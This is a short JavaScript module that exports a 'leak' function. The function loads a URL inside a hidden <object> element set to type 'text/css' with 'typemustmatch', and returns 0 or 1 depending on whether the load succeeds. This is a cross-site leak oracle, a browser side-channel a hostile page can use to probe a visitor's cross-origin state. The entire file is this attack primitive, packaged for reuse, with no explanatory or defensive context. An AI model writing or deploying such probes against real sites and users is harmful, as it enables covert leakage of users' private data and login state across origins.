const leak = async (url) => {
    return new Promise((r) => {
        let s = document.createElement('object')
        s.type = 'text/css'
        s.setAttribute('typemustmatch', 'typemustmatch')
        s.data = url
        s.onload = (e) => {
            e.target.remove()
            return r(0)
        }
        s.onerror = (e) => {
            e.target.remove()
            return r(1)
        }
        document.body.appendChild(s)
    })
}



export { leak}